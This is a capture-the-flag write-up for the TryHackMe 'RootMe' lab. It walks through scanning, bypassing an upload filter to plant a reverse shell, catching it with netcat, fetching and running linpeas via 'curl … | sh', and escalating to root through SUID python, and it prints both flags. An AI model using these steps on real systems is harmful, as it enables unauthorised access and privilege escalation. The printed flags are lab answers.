# RootMe

```bash
export IP=10.10.33.62
```


## Scans

### Nmap

Open Ports:
```
22 -- ssh
80 -- webserver Apache 2.4.29
```

### Gobuster

Directories Found:
```
/uploads -- shows uploaded files
/css
/js
/panel -- upload file form here
```


## Exploit

`.php` files not accepted, `.phtml` is fine

`revshell.phtml` uploaded to `/panel`

Netcat Listening port:
```bash
nc -lnvp 9001
```

going to `/uploads` and opening `revshell.phtml`, spawns a shell

Reverse Shell Achieved.

### Stabilizing Shell

Command: (type carefully, beware of typos in this whole section)
```bash
/usr/bin/script -qc /bin/bash /dev/null
```

To 'background' process:
```bash
<Ctrl> <z>
```

No input return after this command:
```bash
stty raw -echo
```

Typing in the dark:
```bash
<f> <g>
<Return>
<Return>
export TERM=xterm
<Return>
<Return>
```

Shell stabilized. -- tab completion, backspace, CTRL+C, arrow key history functional

User Found: `rootme`


## Linpeas

`linpeas.sh` -- Linux auto enumeration script -- shows vulnerabilities and possible privesc vectors

Uploading linpeas.sh to target: (from host machine)
```bash
sudo python -m SimpleHTTPServer 80
```

Uploading linpeas.sh to target: (from target machine) -- don't forget to change to host tun0 $IP
```bash
curl 10.10.10.10/linpeas.sh | sh 
```

Interesting Info Found:

```
/etc/ssh/ssh_config
/usr/share/keyrings
/var/www/user.txt
```

`/usr/bin/python` has SUID permission!!


**User Flag Found**: `THM{y0u_g0t_a_sh3ll}`


## PrivEsc

searching for Python on [gtfoBins](https://gtfobins.github.io/gtfobins/python/)

Command: (on target machine)
```bash
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Root Shell Achieved.

```bash
ls
cat root.txt
```

**Root Flag Found**: `THM{pr1v1l3g3_3sc4l4t10n}`


---
[back to TryHackMe main page](thm.md)

[back to Index/Table of Contents](index.md)
